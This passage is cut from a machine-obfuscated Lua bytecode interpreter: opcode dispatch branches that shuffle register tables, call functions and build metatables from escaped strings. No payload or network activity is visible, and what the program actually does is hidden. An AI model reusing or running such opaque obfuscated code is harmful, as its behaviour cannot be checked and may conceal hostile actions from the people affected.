a=y[94];w[a]=w[a]-w[a+2];n=y[63];elseif z<278 then w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else n=y[63];end;else local a;local c;local e;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];e=y[63];c=y[758];a=k(w,g,e,c);w[y[94]]=a;end;elseif z<=324 then if(z<=301)then if(z<=289)then if 283>=z then if(z==280 or z<280)then if(z==279)then w[y[94]]=b(d[y[63]],nil,j);else local a,c=0 while true do if a<=12 then if a<=5 then if a<=2 then if a<=0 then c=nil else if 1==a then w={};else for e=0,u,1 do if e<o then w[e]=s[e+1];else break;end;end;end end else if a<=3 then n=n+1;else if a<5 then y=f[n];else w[y[94]]=h[y[63]];end end end else if a<=8 then if a<=6 then n=n+1;else if 7==a then y=f[n];else w[y[94]]=j[y[63]];end end else if a<=10 then if 9==a then n=n+1;else y=f[n];end else if a<12 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if a<=18 then if a<=15 then if a<=13 then y=f[n];else if 14==a then w[y[94]]=y[63];else n=n+1;end end else if a<=16 then y=f[n];else if 18~=a then w[y[94]]=y[63];else n=n+1;end end end else if a<=21 then if a<=19 then y=f[n];else if 21>a then w[y[94]]=y[63];else n=n+1;end end else if a<=23 then if a>22 then c=y[94]else y=f[n];end else if a==24 then w[c]=w[c](r(w,c+1,y[63]))else break end end end end end a=a+1 end end;elseif(281==z or 281>z)then local a,c,e,g,k,q=0 while true do if(a<3 or a==3)then if(a<=1)then if 1>a then c=y[94]else e=y[758]end else if 3~=a then g=(c+2)else k={w[c](w[c+1],w[g])}end end else if(a<5 or a==5)then if a>4 then q=w[c+3]else for c=1,e do w[(g+c)]=k[c];end end else if not(a~=6)then if q then w[g]=q;n=y[63];else n=n+1 end;else break end end end a=(a+1)end elseif 282<z then local a,c=0 while true do if a<=13 then if a<=6 then if a<=2 then if a<=0 then c=nil else if 2~=a then w[y[94]]={};else n=n+1;end end else if a<=4 then if 4~=a then y=f[n];else w[y[94]]=h[y[63]];end else if a<6 then n=n+1;else y=f[n];end end end else if a<=9 then if a<=7 then w[y[94]]=w[y[63]][y[758]];else if 8<a then y=f[n];else n=n+1;end end else if a<=11 then if a>10 then n=n+1;else w[y[94]][y[63]]=w[y[758]];end else if a>12 then w[y[94]]=j[y[63]];else y=f[n];end end end end else if a<=20 then if a<=16 then if a<=14 then n=n+1;else if a~=16 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end else if a<=18 then if 18~=a then n=n+1;else y=f[n];end else if 20>a then w[y[94]]=j[y[63]];else n=n+1;end end end else if a<=23 then if a<=21 then y=f[n];else if a==22 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end else if a<=25 then if 25~=a then y=f[n];else c=y[94]end else if 26==a then w[c]=w[c]()else break end end end end end a=a+1 end else w={};for a=0,u,1 do if a<o then w[a]=s[(a+1)];else break;end;end;end;elseif z<=286 then if(284==z or 284>z)then local a=w[y[94]]+y[758];w[y[94]]=a;if(a<=w[y[94]+1])then n=y[63];end;elseif not(z==286)then local a,c,e=0 while true do if a<=12 then if a<=5 then if a<=2 then if a<=0 then c=nil else if 2~=a then e=nil else w[y[94]]=w[y[63]][y[758]];end end else if a<=3 then n=n+1;else if 4==a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end else if a<=8 then if a<=6 then n=n+1;else if a==7 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end else if a<=10 then if 9==a then n=n+1;else y=f[n];end else if 12>a then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if a<=19 then if a<=15 then if a<=13 then y=f[n];else if a==14 then w[y[94]]=j[y[63]];else n=n+1;end end else if a<=17 then if a<17 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end else if a==18 then n=n+1;else y=f[n];end end end else if a<=22 then if a<=20 then w[y[94]]=w[y[63]][y[758]];else if 21==a then n=n+1;else y=f[n];end end else if a<=24 then if 24>a then e=y[94];else c=w[e];end else if 26~=a then for g=e+1,y[63]do t(c,w[g])end;else break end end end end end a=a+1 end else local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 0==a then c=nil else w[y[94]]=w[y[63]][y[758]];end else if a==2 then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if a<=6 then y=f[n];else if 8>a then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end end else if a<=13 then if a<=10 then if 10~=a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end else if a<=11 then n=n+1;else if 12==a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end else if a<=15 then if a>14 then y=f[n];else n=n+1;end else if a<=16 then c=y[94]else if a==17 then w[c]=w[c](w[c+1])else break end end end end end a=a+1 end end;elseif(z==287 or z<287)then do return w[y[94]]end elseif z~=289 then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[94]]=j[y[63]];end else if 2==a then n=n+1;else y=f[n];end end else if a<=5 then if 4<a then n=n+1;else w[y[94]]=w[y[63]][y[758]];end else if a<=6 then y=f[n];else if 8>a then w[y[94]]=y[63];else n=n+1;end end end end else if a<=13 then if a<=10 then if 10>a then y=f[n];else w[y[94]]=y[63];end else if a<=11 then n=n+1;else if 13>a then y=f[n];else w[y[94]]=y[63];end end end else if a<=15 then if 15~=a then n=n+1;else y=f[n];end else if a<=16 then c=y[94]else if a>17 then break else w[c]=w[c](r(w,c+1,y[63]))end end end end end a=a+1 end else w[y[94]]=y[63];end;elseif z<=295 then if(292>=z)then if(z<290 or z==290)then local a,c,e,g=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0<a then e=nil else c=nil end else if a<=2 then g=nil else if a>3 then n=n+1;else w[y[94]]=h[y[63]];end end end else if a<=6 then if 6>a then y=f[n];else w[y[94]]=h[y[63]];end else if a<=7 then n=n+1;else if 9>a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if a<=14 then if a<=11 then if 11~=a then n=n+1;else y=f[n];end else if a<=12 then w[y[94]]=w[y[63]][w[y[758]]];else if 13<a then y=f[n];else n=n+1;end end end else if a<=16 then if 16>a then g=y[94]else e={w[g](w[g+1])};end else if a<=17 then c=0;else if 19>a then for k=g,y[758]do c=c+1;w[k]=e[c];end else break end end end end end a=a+1 end elseif(292~=z)then local a=w[y[758]];if not a then n=(n+1);else w[y[94]]=a;n=y[63];end;else w[y[94]]=true;end;elseif(293>=z)then local a=y[94];w[a]=w[a]-w[a+2];n=y[63];elseif(295>z)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[94]]=w[y[63]][y[758]];end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if a~=5 then w[y[94]]=h[y[63]];else n=n+1;end else if a<=6 then y=f[n];else if 7==a then w[y[94]]=w[y[63]][w[y[758]]];else n=n+1;end end end end else if a<=13 then if a<=10 then if 10~=a then y=f[n];else w[y[94]]=h[y[63]];end else if a<=11 then n=n+1;else if 13>a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end else if a<=15 then if a~=15 then n=n+1;else y=f[n];end else if a<=16 then c=y[94]else if 17<a then break else w[c]=w[c](r(w,c+1,y[63]))end end end end end a=a+1 end else local a=d[y[63]];local c={};local d={};for e=1,y[758]do n=(n+1);local g=f[n];if(g[680]==12)then d[(e-1)]={w,g[63],nil};else d[e-1]={h,g[63],nil,nil,nil};end;v[(#v+1)]=d;end;m(c,{['\95\95\105\110\100\101\120']=function(e,e)local e=d[e];return e[1][e[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(e,e,g)local d=d[e]d[1][d[2]]=g;end;});w[y[94]]=b(a,c,j);end;elseif 298>=z then if(z==296 or z<296)then if(w[y[94]]<=w[y[758]])then n=y[63];else n=(n+1);end;elseif not(298==z)then w[y[94]]=(w[y[63]]%y[758]);else local a,c,d,e=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0==a then c=nil else d=nil end else if a<=2 then e=nil else if 3<a then n=n+1;else w[y[94]]=h[y[63]];end end end else if a<=6 then if 5<a then w[y[94]]=h[y[63]];else y=f[n];end else if a<=7 then n=n+1;else if a==8 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if a<=14 then if a<=11 then if a<11 then n=n+1;else y=f[n];end else if a<=12 then w[y[94]]=w[y[63]][w[y[758]]];else if a>13 then y=f[n];else n=n+1;end end end else if a<=16 then if 15<a then d={w[e](w[e+1])};else e=y[94]end else if a<=17 then c=0;else if 19>a then for g=e,y[758]do c=c+1;w[g]=d[c];end else break end end end end end a=a+1 end end;elseif 299>=z then local a,c,d,e=0 while true do if a<=9 then if a<=4 then if a<=1 then if a<1 then c=nil else d=nil end else if a<=2 then e=nil else if a~=4 then w[y[94]]=h[y[63]];else n=n+1;end end end else if a<=6 then if 5==a then y=f[n];else w[y[94]]=h[y[63]];end else if a<=7 then n=n+1;else if a~=9 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if a<=14 then if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a<=12 then w[y[94]]=w[y[63]][w[y[758]]];else if 13<a then y=f[n];else n=n+1;end end end else if a<=16 then if a~=16 then e=y[94]else d={w[e](w[e+1])};end else if a<=17 then c=0;else if a==18 then for g=e,y[758]do c=c+1;w[g]=d[c];end else break end end end end end a=a+1 end elseif(301>z)then local a=y[94]local c,d=i(w[a](w[a+1]))p=(d+a-1)local d=0;for e=a,p do d=d+1;w[e]=c[d];end;else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a<1 then c=nil else w[y[94]]=h[y[63]];end else if a==2 then n=n+1;else y=f[n];end end else if a<=5 then if 4==a then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if a>6 then w[y[94]]=y[63];else y=f[n];end end end else if a<=11 then if a<=9 then if a<9 then n=n+1;else y=f[n];end else if a>10 then n=n+1;else w[y[94]]=y[63];end end else if a<=13 then if 13~=a then y=f[n];else c=y[94]end else if 14<a then break else w[c]=w[c](r(w,c+1,y[63]))end end end end a=a+1 end end;elseif 312>=z then if(z<=306)then if 303>=z then if not(z~=302)then local a=y[94];do return w[a](r(w,(a+1),y[63]))end;else local a=y[94]w[a]=w[a](w[a+1])end;elseif(z<304 or z==304)then local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if a<1 then c=nil else w[y[94]]=w[y[63]][y[758]];end else if a<=2 then n=n+1;else if a<4 then y=f[n];else w[y[94]]=h[y[63]];end end end else if a<=7 then if a<=5 then n=n+1;else if 6==a then y=f[n];else w[y[94]]=h[y[63]];end end else if a<=8 then n=n+1;else if a<10 then y=f[n];else w[y[94]]=h[y[63]];end end end end else if a<=15 then if a<=12 then if 11==a then n=n+1;else y=f[n];end else if a<=13 then w[y[94]]=h[y[63]];else if a==14 then n=n+1;else y=f[n];end end end else if a<=18 then if a<=16 then w[y[94]]=w[y[63]];else if 17==a then n=n+1;else y=f[n];end end else if a<=19 then c=y[94]else if 20==a then w[c](r(w,c+1,y[63]))else break end end end end end a=a+1 end elseif 305<z then local a=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0<a then n=n+1;else w[y[94]]=w[y[63]][y[758]];end else if 3~=a then y=f[n];else w[y[94]][y[63]]=w[y[758]];end end else if a<=5 then if a<5 then n=n+1;else y=f[n];end else if 6==a then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end else if a<=11 then if a<=9 then if a<9 then y=f[n];else w[y[94]]=h[y[63]];end else if 10==a then n=n+1;else y=f[n];end end else if a<=13 then if a~=13 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if a<=14 then y=f[n];else if a==15 then if(w[y[94]]~=w[y[758]])then n=n+1;else n=y[63];end;else break end end end end end a=a+1 end else local a=y[94]w[a](w[a+1])end;elseif(z<=309)then if(z<307 or z==307)then local a,c=0 while true do if a<=13 then if(a<=6)then if(a<2 or a==2)then if(a==0 or a<0)then c=nil else if(2>a)then w[y[94]]={};else n=(n+1);end end else if a<=4 then if(4>a)then y=f[n];else w[y[94]]=h[y[63]];end else if not(6==a)then n=n+1;else y=f[n];end end end else if a<=9 then if(a==7 or a<7)then w[y[94]]=w[y[63]][y[758]];else if not(a==9)then n=n+1;else y=f[n];end end else if(a==11 or a<11)then if 11>a then w[y[94]][y[63]]=w[y[758]];else n=(n+1);end else if(a<13)then y=f[n];else w[y[94]]=j[y[63]];end end end end else if a<=20 then if a<=16 then if(a==14 or a<14)then n=(n+1);else if not(16==a)then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end else if(a<18 or a==18)then if 18>a then n=(n+1);else y=f[n];end else if(a~=20)then w[y[94]]=j[y[63]];else n=n+1;end end end else if(a<=23)then if(a<=21)then y=f[n];else if(a<23)then w[y[94]]=w[y[63]][y[758]];else n=(n+1);end end else if a<=25 then if a>24 then c=y[94]else y=f[n];end else if(a>26)then break else w[c]=w[c]()end end end end end a=(a+1)end elseif 308<z then local a=y[94];local c=w[a];for d=(a+1),p do t(c,w[d])end;else w[y[94]]=w[y[63]]%w[y[758]];end;elseif(z==310 or z<310)then local a=0 while true do if a<=14 then if a<=6 then if a<=2 then if a<=0 then w={};else if a==1 then for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;else n=n+1;end end else if a<=4 then if a<4 then y=f[n];else w[y[94]]=h[y[63]];end else if 6>a then n=n+1;else y=f[n];end end end else if a<=10 then if a<=8 then if 7<a then n=n+1;else w[y[94]]=w[y[63]][y[758]];end else if 10~=a then y=f[n];else w[y[94]]=h[y[63]];end end else if a<=12 then if a==11 then n=n+1;else y=f[n];end else if 14~=a then w[y[94]]={};else n=n+1;end end end end else if a<=21 then if a<=17 then if a<=15 then y=f[n];else if 17>a then w[y[94]]={};else n=n+1;end end else if a<=19 then if 19>a then y=f[n];else w[y[94]][y[63]]=w[y[758]];end else if 21~=a then n=n+1;else y=f[n];end end end else if a<=25 then if a<=23 then if a==22 then w[y[94]]=j[y[63]];else n=n+1;end else if 25>a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end else if a<=27 then if 27>a then n=n+1;else y=f[n];end else if 28<a then break else if w[y[94]]then n=n+1;else n=y[63];end;end end end end end a=a+1 end elseif not(312==z)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[94]]=j[y[63]];end else if 3~=a then n=n+1;else y=f[n];end end else if a<=5 then if 4==a then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if a<=6 then y=f[n];else if a~=8 then w[y[94]]=y[63];else n=n+1;end end end end else if a<=13 then if a<=10 then if 9<a then w[y[94]]=y[63];else y=f[n];end else if a<=11 then n=n+1;else if a<13 then y=f[n];else w[y[94]]=y[63];end end end else if a<=15 then if 15>a then n=n+1;else y=f[n];end else if a<=16 then c=y[94]else if 17<a then break else w[c]=w[c](r(w,c+1,y[63]))end end end end end a=a+1 end else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;end;elseif 318>=z then if(z<=315)then if(z<313 or z==313)then local a,c,d,e=0 while true do if(a<9 or a==9)then if(a<4 or a==4)then if(a==1 or a<1)then if(1>a)then c=nil else d=nil end else if(a==2 or a<2)then e=nil else if not(not(4~=a))then w[y[94]]=h[y[63]];else n=(n+1);end end end else if(a<6 or a==6)then if(a<6)then y=f[n];else w[y[94]]=h[y[63]];end else if(a<7 or a==7)then n=(n+1);else if(a>8)then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end end end else if(a<=14)then if(a<=11)then if a>10 then y=f[n];else n=(n+1);end else if(a<12 or a==12)then w[y[94]]=w[y[63]][w[y[758]]];else if not(14==a)then n=(n+1);else y=f[n];end end end else if(a==16 or a<16)then if(a<16)then e=y[94]else d={w[e](w[e+1])};end else if(a==17 or a<17)then c=0;else if(a>18)then break else for g=e,y[758]do c=(c+1);w[g]=d[c];end end end end end end a=a+1 end elseif(315~=z)then local a,c=0 while true do if a<=14 then if a<=6 then if a<=2 then if a<=0 then c=nil else if a~=2 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end else if a<=4 then if 3==a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end else if 5==a then n=n+1;else y=f[n];end end end else if a<=10 then if a<=8 then if a<8 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if 10>a then y=f[n];else w[y[94]]=w[y[63]]*y[758];end end else if a<=12 then if 11<a then y=f[n];else n=n+1;end else if a~=14 then w[y[94]]=w[y[63]]+w[y[758]];else n=n+1;end end end end else if a<=22 then if a<=18 then if a<=16 then if a>15 then w[y[94]]=j[y[63]];else y=f[n];end else if a==17 then n=n+1;else y=f[n];end end else if a<=20 then if 19<a then n=n+1;else w[y[94]]=w[y[63]][y[758]];end else if 22~=a then y=f[n];else w[y[94]]=w[y[63]];end end end else if a<=26 then if a<=24 then if a==23 then n=n+1;else y=f[n];end else if 26~=a then w[y[94]]=w[y[63]]+w[y[758]];else n=n+1;end end else if a<=28 then if 27<a then c=y[94]else y=f[n];end else if a<30 then w[c]=w[c](r(w,c+1,y[63]))else break end end end end end a=a+1 end else w[y[94]]=(w[y[63]]+y[758]);end;elseif(z==316 or z<316)then local a,c,d=0 while true do if a<=24 then if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if a<2 then d=nil else w[y[94]]={};end end else if a<=3 then n=n+1;else if 4<a then w[y[94]]=h[y[63]];else y=f[n];end end end else if a<=8 then if a<=6 then n=n+1;else if 7==a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end else if a<=9 then n=n+1;else if 10<a then w[y[94]]=h[y[63]];else y=f[n];end end end end else if a<=17 then if a<=14 then if a<=12 then n=n+1;else if a==13 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end else if a<=15 then n=n+1;else if a==16 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end else if a<=20 then if a<=18 then n=n+1;else if a==19 then y=f[n];else w[y[94]]={};end end else if a<=22 then if 22~=a then n=n+1;else y=f[n];end else if a<24 then w[y[94]]={};else n=n+1;end end end end end else if a<=37 then if a<=30 then if a<=27 then if a<=25 then y=f[n];else if 26==a then w[y[94]]=h[y[63]];else n=n+1;end end else if a<=28 then y=f[n];else if 29==a then w[y[94]][y[63]]=w[y[758]];else n=n+1;end end end else if a<=33 then if a<=31 then y=f[n];else if a<33 then w[y[94]]=h[y[63]];else n=n+1;end end else if a<=35 then if a==34 then y=f[n];else w[y[94]][y[63]]=w[y[758]];end else if a>36 then y=f[n];else n=n+1;end end end end else if a<=43 then if a<=40 then if a<=38 then w[y[94]][y[63]]=w[y[758]];else if 39<a then y=f[n];else n=n+1;end end else if a<=41 then w[y[94]]={r({},1,y[63])};else if 42==a then n=n+1;else y=f[n];end end end else if a<=46 then if a<=44 then w[y[94]]=w[y[63]];else if a<46 then n=n+1;else y=f[n];end end else if a<=48 then if 47<a then c=w[d];else d=y[94];end else if 50~=a then for e=d+1,y[63]do t(c,w[e])end;else break end end end end end end a=a+1 end elseif z<318 then w[y[94]][w[y[63]]]=w[y[758]];else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[94]]=w[y[63]][y[758]];end else if a>2 then y=f[n];else n=n+1;end end else if a<=5 then if a<5 then w[y[94]]=y[63];else n=n+1;end else if 6==a then y=f[n];else w[y[94]]=y[63];end end end else if a<=11 then if a<=9 then if 8==a then n=n+1;else y=f[n];end else if a>10 then n=n+1;else w[y[94]]=y[63];end end else if a<=13 then if a<13 then y=f[n];else c=y[94]end else if a>14 then break else w[c]=w[c](r(w,c+1,y[63]))end end end end a=a+1 end end;elseif(z<321 or z==321)then if(319==z or 319>z)then w[y[94]]=j[y[63]];elseif not(z==321)then w[y[94]]=#w[y[63]];else local a,c,d,e=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0==a then c=nil else d=nil end else if a<=2 then e=nil else if a<4 then w[y[94]]=h[y[63]];else n=n+1;end end end else if a<=6 then if a==5 then y=f[n];else w[y[94]]=h[y[63]];end else if a<=7 then n=n+1;else if a~=9 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if a<=14 then if a<=11 then if 11>a then n=n+1;else y=f[n];end else if a<=12 then w[y[94]]=w[y[63]][w[y[758]]];else if 14>a then n=n+1;else y=f[n];end end end else if a<=16 then if a~=16 then e=y[94]else d={w[e](w[e+1])};end else if a<=17 then c=0;else if a==18 then for g=e,y[758]do c=c+1;w[g]=d[c];end else break end end end end end a=a+1 end end;elseif(z==322 or z<322)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0<a then w[y[94]]=h[y[63]];else c=nil end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if 5~=a then w[y[94]]=y[63];else n=n+1;end else if 7~=a then y=f[n];else w[y[94]]=y[63];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if 11>a then w[y[94]]=y[63];else n=n+1;end end else if a<=13 then if a==12 then y=f[n];else c=y[94]end else if a<15 then w[c]=w[c](r(w,c+1,y[63]))else break end end end end a=a+1 end elseif not(323~=z)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a>0 then w[y[94]]=w[y[63]][y[758]];else c=nil end else if 3~=a then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[94]]=y[63];else n=n+1;end else if a~=7 then y=f[n];else w[y[94]]=y[63];end end end else if a<=11 then if a<=9 then if a==8 then n=n+1;else y=f[n];end else if a>10 then n=n+1;else w[y[94]]=y[63];end end else if a<=13 then if a<13 then y=f[n];else c=y[94]end else if 14==a then w[c]=w[c](r(w,c+1,y[63]))else break end end end end a=a+1 end else local a,c=0 while true do if a<=22 then if a<=10 then if a<=4 then if a<=1 then if a==0 then c=nil else w[y[94]]=w[y[63]][y[758]];end else if a<=2 then n=n+1;else if a>3 then w[y[94]]=h[y[63]];else y=f[n];end end end else if a<=7 then if a<=5 then n=n+1;else if 6<a then w[y[94]]=h[y[63]];else y=f[n];end end else if a<=8 then n=n+1;else if 9==a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if a<=16 then if a<=13 then if a<=11 then n=n+1;else if 13>a then y=f[n];else w[y[94]]=w[y[63]][w[y[758]]];end end else if a<=14 then n=n+1;else if a>15 then w[y[94]]={};else y=f[n];end end end else if a<=19 then if a<=17 then n=n+1;else if 19~=a then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end else if a<=20 then n=n+1;else if 21==a then y=f[n];else w[y[94]][y[63]]=w[y[758]];end end end end end else if a<=33 then if a<=27 then if a<=24 then if a<24 then n=n+1;else y=f[n];end else if a<=25 then w[y[94]]=h[y[63]];else if a==26 then n=n+1;else y=f[n];end end end else if a<=30 then if a<=28 then w[y[94]]=w[y[63]][y[758]];else if a>29 then y=f[n];else n=n+1;end end else if a<=31 then w[y[94]][y[63]]=w[y[758]];else if a>32 then y=f[n];else n=n+1;end end end end else if a<=39 then if a<=36 then if a<=34 then w[y[94]]=h[y[63]];else if 36~=a then n=n+1;else y=f[n];end end else if a<=37 then w[y[94]]=w[y[63]][y[758]];else if a<39 then n=n+1;else y=f[n];end end end else if a<=42 then if a<=40 then w[y[94]][y[63]]=w[y[758]];else if 42>a then n=n+1;else y=f[n];end end else if a<=43 then c=y[94]else if a==44 then w[c](r(w,c+1,y[63]))else break end end end end end end a=a+1 end end;elseif 347>=z then if z<=335 then if 329>=z then if 326>=z then if 326~=z then w[y[94]]=#w[y[63]];else local a=y[94]w[a]=w[a](r(w,a+1,y[63]))end;elseif 327>=z then local a;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];a=y[94]w[a]=w[a](w[a+1])elseif z~=329 then local a;local c;local d;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];d=y[94]c={w[d](w[d+1])};a=0;for e=d,y[758]do a=a+1;w[e]=c[a];end else local a;local c;local d;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];d=y[94]c={w[d](w[d+1])};a=0;for e=d,y[758]do a=a+1;w[e]=c[a];end end;elseif 332>=z then if z<=330 then local a;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];a=y[94]w[a]=w[a](r(w,a+1,y[63]))elseif 331==z then w[y[94]]=false;n=n+1;else local a;local c;local d;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];d=y[94]c={w[d](w[d+1])};a=0;for e=d,y[758]do a=a+1;w[e]=c[a];end end;elseif 333>=z then local a,c=0 while true do if(a==12 or a<12)then if(a==5 or a<5)then if(a<2 or a==2)then if(a==0 or a<0)then c=nil else if(1==a)then w={};else for d=0,u,1 do if d<o then w[d]=s[(d+1)];else break;end;end;end end else if(a<=3)then n=n+1;else if(5~=a)then y=f[n];else w[y[94]]=h[y[63]];end end end else if(a<8 or a==8)then if(a<6 or a==6)then n=n+1;else if(a~=8)then y=f[n];else w[y[94]]=j[y[63]];end end else if(a==10 or a<10)then if not(10==a)then n=n+1;else y=f[n];end else if(11<a)then n=n+1;else w[y[94]]=w[y[63]][y[758]];end end end end else if a<=18 then if(a<15 or a==15)then if a<=13 then y=f[n];else if a>14 then n=(n+1);else w[y[94]]=y[63];end end else if(a<=16)then y=f[n];else if not(18==a)then w[y[94]]=y[63];else n=n+1;end end end else if(a<21 or a==21)then if(a<=19)then y=f[n];else if(a>20)then n=(n+1);else w[y[94]]=y[63];end end else if(a==23 or a<23)then if(22<a)then c=y[94]else y=f[n];end else if a<25 then w[c]=w[c](r(w,c+1,y[63]))else break end end end end end a=(a+1)end elseif z<335 then local a=y[94]w[a]=w[a]()else local a;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];a=y[94]w[a]=w[a](r(w,a+1,y[63]))end;elseif z<=341 then if z<=338 then if z<=336 then local a=y[94];local c=y[758];local d=a+2;local e={w[a](w[a+1],w[d])};for g=1,c do w[d+g]=e[g];end local a=w[a+3];if a then w[d]=a;n=y[63];else n=n+1 end;elseif 338>z then if(y[94]<=w[y[758]])then n=n+1;else n=y[63];end;else if(w[y[94]]~=y[758])then n=n+1;else n=y[63];end;end;elseif 339>=z then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0<a then w[y[94]]=j[y[63]];else c=nil end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if 5>a then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if 6<a then w[y[94]]=h[y[63]];else y=f[n];end end end else if a<=11 then if a<=9 then if 9~=a then n=n+1;else y=f[n];end else if a<11 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end else if a<=13 then if a==12 then y=f[n];else c=y[94]end else if 15>a then w[c]=w[c](w[c+1])else break end end end end a=a+1 end elseif z>340 then local a;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];a=y[94]w[a]=w[a](r(w,a+1,y[63]))else w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else n=y[63];end;end;elseif 344>=z then if 342>=z then local a;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];a=y[94]w[a]=w[a](r(w,a+1,y[63]))elseif z~=344 then local a;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];a=y[94]w[a]=w[a](r(w,a+1,y[63]))else local a;local c,d;local 